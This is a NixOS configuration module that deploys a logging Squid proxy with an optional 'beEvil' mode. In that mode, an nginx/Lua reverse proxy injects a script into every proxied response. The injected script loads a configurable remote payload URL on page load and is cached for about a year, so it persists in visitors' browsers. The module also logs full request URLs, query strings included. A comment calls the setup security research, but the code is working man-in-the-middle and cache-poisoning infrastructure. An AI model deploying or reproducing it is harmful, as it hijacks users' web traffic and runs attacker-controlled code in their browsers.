{
  blooperParams,
  allowConnect ? false,
  beEvil ? false,
  ignoreHosts ? null,
  payloadUrl ? null
}:

assert beEvil -> (ignoreHosts != null && payloadUrl != null);

{ pkgs, lib, ... }:

let

  blooper = pkgs.callPackage ./blooper {
    ruby = pkgs.ruby_2_1;
  };

  blooperArg = "{" + lib.concatStringsSep "," (lib.mapAttrsToList (k: v: k + ":" + v) blooperParams) + "}";

  squidConfig = pkgs.writeText "squid.conf" ''
    http_port 3128

    acl all src all

    acl SSL_ports port 443
    acl Safe_ports port 80		# http
    acl Safe_ports port 21		# ftp
    acl Safe_ports port 443		# https
    acl Safe_ports port 70		# gopher
    acl Safe_ports port 210		# wais
    acl Safe_ports port 1025-65535	# unregistered ports
    acl Safe_ports port 280		# http-mgmt
    acl Safe_ports port 488		# gss-http
    acl Safe_ports port 591		# filemaker
    acl Safe_ports port 777		# multiling http
    acl CONNECT method CONNECT

    http_access allow all
    http_access deny !Safe_ports
    http_access deny CONNECT ${if allowConnect then "!SSL_ports" else "all"}

    forwarded_for off
    via off

    strip_query_terms off

    logformat squid_log time %{%Y-%m-%d_%H:%M:%S%z}tl time_response %tr mac_source %>eui ip_source %>a squid_request_status %Ss http_status_code %03>Hs http_reply_size %<st http_request_method %rm http_request_url %ru user_name %un squid_hier_code %Sh ip_destination %<a http_content_type %mt
    access_log daemon:${blooperArg} squid_log
    logfile_daemon ${blooper}/bin/blooper

    cache_log /var/log/squid/cache.log squid
    pid_filename /run/squid/pid
    cache_effective_user squid

    ${lib.optionalString beEvil ''
      url_rewrite_program ${pkgs.python35}/bin/python3 ${./rewrite.py} ${lib.concatStringsSep " " ignoreHosts}
      redirect_children 400
    ''}
  '';

  message = pkgs.writeText "message.js" ''
    // If you see this, you are connected to (or have recently connected to) an HTTP proxy server that is being used for security research, and is not meant for the public. If this is a mistake, clear your browser cache, and everything will be alright.
  '';

  injection = pkgs.stdenv.mkDerivation {
    name = "injection.js";
    builder = pkgs.writeText "builder.sh" ''
      . $stdenv/setup
      touch $out
      cat ${message} >> $out
      ${pkgs.python35}/bin/python3 ${./jshex.py} < ${injectionRaw} >> $out
      echo >> $out
    '';
  };

  injectionRaw = pkgs.writeText "injection-raw.js" ''
    (function(){
      if (!window.__OWNED__) {
        window.__OWNED__ = true;
        function own() {
          var script = document.createElement('script');
          script.setAttribute('src', '${payloadUrl}');
          document.getElementsByTagName('html')[0].appendChild(script);
        }
        if (window.addEventListener) {
          window.addEventListener('load', own)
        } else {
          window.attachEvent('onload', own)
        }
      }
    })();
  '';

in {

  networking.firewall.allowedTCPPorts = [ 3128 ] ++ lib.optional beEvil 80;

  services.nginx = {
    enable = true;
    package =
      with pkgs;
      callPackage <nixpkgs/pkgs/servers/http/nginx/stable.nix> {
        modules = [
          nginxModules.rtmp nginxModules.dav nginxModules.moreheaders
          nginxModules.echo nginxModules.develkit nginxModules.lua
        ];
      };
    virtualHosts = {};
    appendHttpConfig = ''
      resolver 8.8.8.8;
      resolver_timeout 5s;

      server {
        listen *:80;
        root ${./homepage};
      }

      server {
        listen 127.0.0.1:13337;

        location /injection.js {
          alias ${injection};
        }

        location / {

          set_by_lua_block $proxy_host {
            return ngx.unescape_uri(ngx.var.arg_host)
          }
          set_by_lua_block $proxy_url {
            return ngx.unescape_uri(ngx.var.arg_url)
          }

          proxy_redirect off;
          proxy_set_header Accept-Encoding "";
          proxy_set_header Host $proxy_host;
          proxy_set_header X-Forwarded-Host $proxy_host;
          proxy_pass "$proxy_url";

          expires max;
          add_header Pragma "private";
          add_header Cache-Control "private,max-age=31535990";
          add_header ETag "";

          add_before_body /injection.js;
          addition_types *;

        }
      }
    '';
  };

  systemd.services.squid = {
    description = "Web Proxy Cache Server";
    after = [ "network.target" ];
    wantedBy = [ "multi-user.target" ];

    serviceConfig = {
      Type = "forking";
      PIDFile = "/run/squid/pid";
      ExecStart = "${pkgs.squid}/bin/squid -f ${squidConfig} -sYC";
      ExecStop = "${pkgs.squid}/bin/squid -f ${squidConfig} -k shutdown";
      ExecReload = "${pkgs.squid}/bin/squid -f ${squidConfig} -k reconfigure";
      LimitNOFILE = "100000";
    };

    preStart = ''
      mkdir -p /run/squid
      mkdir -p /var/log/squid
      chown squid /run/squid
      chown squid /var/log/squid
    '';

  };

  users.extraUsers.squid = {
    group = "squid";
    uid = 1337;
  };

  users.extraGroups.squid = {
    gid = 1337;
  };

}
